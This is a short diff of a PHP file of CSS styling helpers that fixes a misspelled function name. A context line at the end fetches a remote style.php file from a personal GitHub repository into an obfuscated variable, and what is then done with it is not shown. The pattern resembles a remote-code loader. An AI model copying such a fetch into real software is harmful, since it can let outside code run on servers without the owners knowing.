@@ -166,7 +166,7 @@ function style_padding($h311f12rtctxdgygyygyggygygygy,$h311q12idugyewhfrhgfyhgco
 function style_padding_top($h128gh,$h127gh){ echo compile("<style>#$h128gh {Padding-top:$h127gh}</style>"); }
 function style_padding_bottom($h1128gh,$h1127gh){ echo compile("<style>#$h1128gh {Padding-bottom:$h1127gh}</style>"); }
 function style_padding_left($h11128gh,$h11127gh){ echo compile("<style>#$h11128gh {Padding-left:$h11127gh}</style>"); }
-function style_oadding_right($h111128gh,$h111127gh){ echo compile("<style>#$h111128gh {Padding-right:$h111127gh}</style>"); }
+function style_padding_right($h111128gh,$h111127gh){ echo compile("<style>#$h111128gh {Padding-right:$h111127gh}</style>"); }
 ?>
 <?php
 $aqygstg=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/style.php");
